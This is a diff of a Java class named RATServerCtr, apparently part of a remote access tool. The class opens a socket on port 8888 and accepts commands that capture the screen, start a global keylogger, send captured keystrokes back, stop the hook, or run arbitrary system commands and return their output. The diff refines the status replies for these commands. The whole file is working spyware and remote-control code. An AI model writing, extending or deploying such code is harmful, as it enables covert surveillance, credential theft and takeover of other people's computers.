@@ -1,6 +1,5 @@
 package controllers;
 
-import java.awt.AWTException;
 import java.awt.Rectangle;
 import java.awt.Robot;
 import java.awt.Toolkit;
@@ -12,13 +11,9 @@ import java.io.DataOutputStream;
 import java.io.IOException;
 import java.io.InputStream;
 import java.io.InputStreamReader;
-import java.io.ObjectOutputStream;
-import java.io.OutputStream;
 import java.net.ServerSocket;
 import java.net.Socket;
-import java.nio.ByteBuffer;
 import java.util.ArrayList;
-import java.util.Arrays;
 import javax.imageio.ImageIO;
 import views.RATServerView;
 
@@ -32,7 +27,7 @@ import lc.kra.system.keyboard.event.GlobalKeyEvent;
  */
 public class RATServerCtr {
     private int port;
-    private String host;
+    //private String host;
     private ServerSocket myServer;
     private ArrayList<Socket> list;
     private static Socket s;
@@ -41,7 +36,7 @@ public class RATServerCtr {
 
     public RATServerCtr() {
         port = 8888;
-        host = "localhost";
+        //host = "localhost";
         list = new ArrayList<>();
         openSocket();
         while(true) {
@@ -57,9 +52,7 @@ public class RATServerCtr {
     
     public void sendResult(String res) {
         try {
-//            ObjectOutputStream oos = new ObjectOutputStream(list.get(list.size()-1).getOutputStream());
             DataOutputStream dout = new DataOutputStream(list.get(list.size()-1).getOutputStream());
-//            oos.writeObject(res);
             dout.writeUTF(res);
         } catch (Exception e) {
             e.printStackTrace();
@@ -74,7 +67,6 @@ public class RATServerCtr {
             switch (mode) {
                 case "Pic":
                     sendResult("ok");
-                    //System.out.println(mode);
                     sendPic();
                     break;
                 case "Key":
@@ -83,18 +75,22 @@ public class RATServerCtr {
                     keyHook = getKeyStrokeOn(key);
                     break;
                 case "Get":
-                    sendResult("ok");
-                    sendKeys(key);
-                    break;
+                    if(keyHook.isAlive()) {
+                        sendResult("ok");
+                        sendKeys(key);
+                        break;
+                    }else {
+                        sendResult("no");
+                        sendKeys(key);
+                        break;
+                    }
                 case "Drop":
                     sendResult("ok");
                     keyHook.shutdownHook();
                     key.clear();
                     break;
                 default:
-                    sendResult("ok");
                     commandHandler(mode); //hand and send res
-                    //sendCommandRes();
                     break;
             }
         } catch (Exception e) {
@@ -115,15 +111,6 @@ public class RATServerCtr {
         DataInputStream dis = new DataInputStream(ips);
         String input = dis.readUTF();
         return input;
-    }
-    
-    public void sendError(String res) {
-        try {
-            DataOutputStream dout = new DataOutputStream(list.get(list.size()-1).getOutputStream());
-            dout.writeUTF(res);
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
     }
     
     public void sendPic() throws IOException {
@@ -149,10 +136,11 @@ public class RATServerCtr {
             BufferedReader input = new BufferedReader(new InputStreamReader(proc.getInputStream()));
             BufferedReader error = new BufferedReader(new InputStreamReader(proc.getErrorStream()));
             String line = "";
-            String err = "";
-            if((err = error.readLine()) != null) {
-                sendResult("");
+            if(error.readLine() != null) {
+                sendResult("no");
+                System.out.println("Error!");
             }else {
+                sendResult("ok");
                 ArrayList<String> lines = new ArrayList<>();
                 while((line = input.readLine()) != null) {
                     lines.add(line);   
